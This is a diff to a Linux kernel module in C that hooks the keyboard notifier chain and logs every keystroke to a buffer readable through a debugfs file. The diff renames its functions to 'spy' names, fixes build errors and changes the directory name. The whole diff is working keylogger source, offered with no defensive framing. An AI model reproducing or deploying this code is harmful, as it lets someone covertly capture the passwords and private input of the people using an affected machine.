@@ -12,6 +12,8 @@
 #define HEX 1 // Type code for hexadecimal log
 #define DEC 2 // Type code for decimal log
 
+MODULE_LICENSE("GPL v2");
+
 // Declarations
 static int codes; // User-specified log pattern
 module_param(codes, int, 0644);
@@ -25,7 +27,7 @@ static struct dentry *subdir;
 static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);
 
 // Keyboard notifier callback function invoked on keyboard events
-static int kb_callback(struct notifier_block *nblock, unsigned long code, void *_param);
+static int spy_cb(struct notifier_block *nblock, unsigned long code, void *_param);
 
 
 // US keymap
@@ -72,7 +74,7 @@ static const char *us_keymap[][2] = {
 
 // Buffer to store the logged keys
 static size_t buf_pos;
-static char keys_buf[BUF_LEN];
+static char keys_buf[BUF_SIZE];
 
 // Debugfs file operations
 const struct file_operations keys_fops = {
@@ -83,13 +85,14 @@ const struct file_operations keys_fops = {
 // Read function to allow user-space programs to read logged keys from the Debugfs file
 static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset) {
     return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
+}
 
 // Keyboard notifier block
-static struct notifier_block kb_notify_blk = {
-	.notifier_call = kb_callback,
+static struct notifier_block spy_blk = {
+	.notifier_call = spy_cb,
 };
 
-} // Method keys_read
+// Method keys_read
 
 /** 
 * Store keycode as a string saved to the buffer
@@ -102,24 +105,24 @@ void string_conv(int kode, int shifted, char *buffer, int sys) {
 	switch (sys) {
 	case US: // For US system
 		if (kode > KEY_RESERVED && kode <= KEY_PAUSE) { // check to see if kode is in the valid range for us keymap
-			const char *us_key = (shifted == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0]; // Determine if shift key was pressed
-			snprintf(buffer, CHUNK_LEN, "%s", us_key); // store the string in the buffer
+			const char *us_key = (shifted == 1) ? us_keymap[kode][1] : us_keymap[kode][0]; // Determine if shift key was pressed
+			snprintf(buffer, KEYCODE_LEN, "%s", us_key); // store the string in the buffer
 		} // if statement
 		break;
 	case HEX: // For hexadecimal system
 		if (kode > KEY_RESERVED && kode < KEY_MAX) { // check to see if kode is in the valid range for hexadecimal keymap
-			snprintf(buffer, CHUNK_LEN, "%x %x", kode, shifted); // store the string in the buffer
+			snprintf(buffer, KEYCODE_LEN, "%x %x", kode, shifted); // store the string in the buffer
 		} // if statement 
 		break;
 	case DEC: // For decimal system
 		if (kode > KEY_RESERVED && kode < KEY_MAX) { // check to see if kode is in the valid range for decimal keymap
-			snprintf(buffer, CHUNK_LEN, "%d %d", kode, shifted); // store the string in the buffer
+			snprintf(buffer, KEYCODE_LEN, "%d %d", kode, shifted); // store the string in the buffer
 		} // if statement
 		break;
 	} // switch statement
 } // Method string_conv
 
-int kb_callback(struct notifier_block *nblock,
+int spy_cb(struct notifier_block *nblock,
 		  unsigned long code,
 		  void *_param)
 {
@@ -135,13 +138,13 @@ int kb_callback(struct notifier_block *nblock,
 		return NOTIFY_OK; //returns 0x001
 	
 	/* Convert keycode to readable string in keybuf */
-	keycode_to_string(param->value, param->shift, keybuf, codes);
+	string_conv(param->value, param->shift, keybuf, codes);
 	len = strlen(keybuf);
 	if (len < 1) /* Unmapped keycode */
 		return NOTIFY_OK; //returns 0x001
 
 	/* Reset key string buffer position if exhausted */
-	if ((buf_pos + len) >= BUF_LEN) //if buffer position is greater than buffer length then reset to 0
+	if ((buf_pos + len) >= BUF_SIZE) //if buffer position is greater than buffer length then reset to 0
 		buf_pos = 0;
 
 	/* Copy readable key to key string buffer */
@@ -157,32 +160,32 @@ int kb_callback(struct notifier_block *nblock,
 }
 
 // Module initialization
-static int __init module_init(void)
+static int __init spy_init(void)
 {
     if (codes < 0 || codes > 2)
         return -EINVAL;
 
-    subdir = debugfs_create_dir("vault", NULL); // Creates debugfs directory
+    subdir = debugfs_create_dir("kisni", NULL); // Creates debugfs directory
     if (IS_ERR(subdir))
         return PTR_ERR(subdir);
     if (!subdir)
         return -ENOENT;
 
-    file = debugfs_create_file("secret", 0400, subdir, NULL, &keys_fops); // Creates debugfs file to read keys from
+    file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops); // Creates debugfs file to read keys from
     if (!file) {
         debugfs_remove_recursive(subdir);
         return -ENOENT;
     }
 
-    register_keyboard_notifier(&kb_notify_blk);
+    register_keyboard_notifier(&spy_blk);
     return 0;
 }
 
-static void __exit module_exit(void)
+static void __exit spy_exit(void)
 {
-    unregister_keyboard_notifier(&kb_notify_blk);
+    unregister_keyboard_notifier(&spy_blk);
     debugfs_remove_recursive(subdir);
 }
 
-module_init(module_init);
-module_exit(module_exit);
+module_init(spy_init);
+module_exit(spy_exit);
